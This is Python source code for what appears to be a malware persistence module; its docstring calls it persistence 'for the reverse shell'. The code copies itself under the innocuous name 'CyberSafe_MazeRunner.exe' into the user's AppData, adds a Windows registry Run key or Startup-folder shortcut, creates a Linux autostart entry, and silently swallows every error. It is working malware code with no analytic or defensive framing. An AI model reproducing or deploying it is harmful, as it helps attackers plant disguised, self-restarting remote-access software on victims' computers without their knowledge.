import ctypes
import os
import sys
import platform
import shutil
import winreg
import tempfile


def is_admin():
    """Check for admin/root privileges."""
    try:
        return os.getuid() == 0 if platform.system() != "Windows" else ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def get_startup_path():
    """Get the path for persistence based on the platform"""
    if platform.system() == "Windows":
        return os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    elif platform.system() == "Linux":
        return os.path.expanduser("~/.config/autostart")
    elif platform.system() == "Darwin":  # macOS
        return os.path.expanduser("~/Library/LaunchAgents")
    else:
        return None


def establish_persistence():
    """Set up persistence for the reverse shell."""
    try:
        if platform.system() == "Windows":
            # Method 1: Registry Run key
            exe_name = "CyberSafe_MazeRunner.exe"
            if getattr(sys, 'frozen', False):
                # Running as compiled executable
                current_exe = sys.executable
            else:
                # Running as script
                current_exe = os.path.abspath(sys.argv[0])

            dest_dir = os.path.join(os.getenv("LOCALAPPDATA"), "CyberSafeMaze")
            os.makedirs(dest_dir, exist_ok=True)
            dest_path = os.path.join(dest_dir, exe_name)

            # Copy executable to destination if not already there
            if not os.path.exists(dest_path) or not os.path.samefile(current_exe, dest_path):
                shutil.copy2(current_exe, dest_path)

            # Add to registry
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                     winreg.KEY_WRITE)
                winreg.SetValueEx(key, "CyberSafeMaze", 0, winreg.REG_SZ, f'"{dest_path}"')
                winreg.CloseKey(key)
            except Exception:
                # If registry fails, try the startup folder
                startup_path = get_startup_path()
                if startup_path:
                    shortcut_path = os.path.join(startup_path, "CyberSafeMaze.lnk")
                    create_shortcut(dest_path, shortcut_path)

            return True

        elif platform.system() == "Linux":
            # Create autostart entry for Linux
            startup_path = get_startup_path()
            if startup_path:
                os.makedirs(startup_path, exist_ok=True)
                desktop_file = os.path.join(startup_path, "cybersafemaze.desktop")

                if getattr(sys, 'frozen', False):
                    # Running as compiled executable
                    script_path = sys.executable
                else:
                    # Running as script
                    script_path = os.path.abspath(sys.argv[0])

                content = f"""[Desktop Entry]
Name=CyberSafeMaze
Type=Application
Exec={script_path}
Terminal=false
X-GNOME-Autostart-enabled=true
"""
                with open(desktop_file, "w") as f:
                    f.write(content)
                os.chmod(desktop_file, 0o755)
                return True

    except Exception as e:
        # Silently continue on error
        pass
    return False


def create_shortcut(target, shortcut_path):
    """Create a Windows shortcut"""
    try:
        import pythoncom
        from win32com.client import Dispatch

        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = os.path.dirname(target)
        shortcut.IconLocation = target
        shortcut.save()
    except:
        # If win32com is not available, try a more basic approach
        with open(shortcut_path, 'w') as f:
            f.write(f"[InternetShortcut]\nURL=file:///{target.replace(' ', '%20')}\n")